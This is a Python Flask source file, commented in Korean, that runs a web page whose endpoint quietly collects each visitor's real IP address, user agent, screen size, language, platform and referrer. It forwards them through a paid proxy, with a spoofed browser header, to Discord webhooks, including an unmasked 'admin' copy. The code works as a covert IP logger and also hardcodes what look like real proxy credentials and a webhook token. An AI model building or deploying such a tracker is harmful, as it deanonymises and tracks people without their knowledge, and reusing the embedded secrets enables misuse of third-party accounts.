import requests
import datetime
import os
import time
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

# [프록시 설정] 주신 정보를 requests 형식에 맞게 넣었습니다.
# 만약 10000번 포트가 안 되면 10001~10009로 바꿔보세요.
PROXY_URL = "http://mkmp3kpf:pka5tdl4@p.tokenu.to:10000"
PROXIES = {
    "http": PROXY_URL,
    "https": PROXY_URL
}

# [웹훅 주소]
MASKED_CHANNEL_URL = "https://discordapp.com/api/webhooks/1477910235048968275/otX6RnzhUAWP3WJRe8A_wMAQ9hWyLPSoY3kIAhYC__CIr87A1bXqoRLyWpeHnTsRPA_v"
RAW_CHANNEL_URL = "https://discordapp.com/api/webhooks/1477910235048968275/otX6RnzhUAWP3WJRe8A_wMAQ9hWyLPSoY3kIAhYC__CIr87A1bXqoRLyWpeHnTsRPA_v"

def get_masked_ip(ip):
    try:
        parts = ip.split('.')
        if len(parts) == 4:
            return f"{parts[0]}.{parts[1]}.xxx.xxx"
        return ip
    except:
        return "Unknown"

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/webhook', methods=['POST'])
def send_to_discord():
    try:
        client_data = request.json or {}
        
        # 실제 방문자 IP 추출
        x_forwarded = request.headers.get('X-Forwarded-For')
        raw_ip = x_forwarded.split(',')[0].strip() if x_forwarded else request.remote_addr
        
        masked_ip = get_masked_ip(raw_ip)
        user_agent = request.headers.get('User-Agent', 'Unknown')
        timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        discord_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
        }

        def create_payload(ip_val, title_prefix, color, is_admin=False):
            icon = "🛡️" if is_admin else "🌐"
            return {
                "username": f"{title_prefix} 시스템",
                "avatar_url": "https://i.imgur.com/4M34hi2.png",
                "embeds": [{
                    "title": f"{icon} {title_prefix}: 접속 감지",
                    "description": "유료 프록시 서버를 통해 안전하게 전송된 로그입니다.",
                    "color": color,
                    "fields": [
                        {"name": "📍 접속 IP", "value": f"`{ip_val}`", "inline": False},
                        {"name": "🌍 언어/지역", "value": f"`{client_data.get('language', 'N/A')}`", "inline": False},
                        {"name": "🖥️ 해상도", "value": f"`{client_data.get('screen', 'N/A')}`", "inline": False},
                        {"name": "⚙️ 플랫폼", "value": f"`{client_data.get('platform', 'N/A')}`", "inline": False},
                        {"name": "🔗 유입 경로", "value": f"`{request.referrer or '직접 접속'}`", "inline": False},
                        {"name": "🕵️ 상세 기기 정보", "value": f"```{user_agent}```", "inline": False}
                    ],
                    "footer": {
                        "text": f"기록 시각: {timestamp} | Proxy Mode Active",
                        "icon_url": "https://i.imgur.com/fKL3Sjy.png"
                    }
                }]
            }

        # 1. 마스킹 버전 전송 (프록시 경유)
        res1 = requests.post(
            MASKED_CHANNEL_URL, 
            json=create_payload(masked_ip, "일반 모니터링", 5763719), 
            headers=discord_headers,
            proxies=PROXIES,
            timeout=15 # 프록시는 약간의 지연이 있을 수 있음
        )
        print(f"Masked Send (Proxy): {res1.status_code}")

        time.sleep(1.5)

        # 2. 관리자 버전 전송 (프록시 경유)
        res2 = requests.post(
            RAW_CHANNEL_URL, 
            json=create_payload(raw_ip, "관리자 보안 로그", 15548997, is_admin=True), 
            headers=discord_headers,
            proxies=PROXIES,
            timeout=15
        )
        print(f"Raw Send (Proxy): {res2.status_code}")

    except Exception as e:
        print(f"Proxy Connection Error: {e}")

    return jsonify({"status": "success"})

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
